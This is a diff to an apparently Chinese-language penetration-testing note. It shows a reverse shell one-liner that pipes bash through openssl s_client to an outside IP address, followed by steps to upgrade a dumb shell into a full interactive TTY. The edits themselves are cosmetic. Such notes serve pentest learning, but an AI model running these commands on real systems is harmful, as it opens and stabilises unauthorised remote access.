@@ -38,7 +38,7 @@ mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect 121.4.
 ```
 第一步，在哑shell中执行：
 python -c 'import pty;pty.spawn("/bin/bash")'
-第二步：键入Ctrl-Z，回到VPS的命令行中
+第二步：键入Ctrl-z，回到VPS的命令行中
 第三步，在VPS中执行下述命令回到哑shell中：
 stty raw -echo
 fg
@@ -47,6 +47,8 @@ reset
 export SHELL=bash
 export TERM=xterm-256color
 stty rows 54 columns 104
+此时，VPS上的shell为功能基本齐全的shell
 ```
 
-https://www.freebuf.com/vuls/211847.html  
+参考链接：  
+https://www.freebuf.com/vuls/211847.html
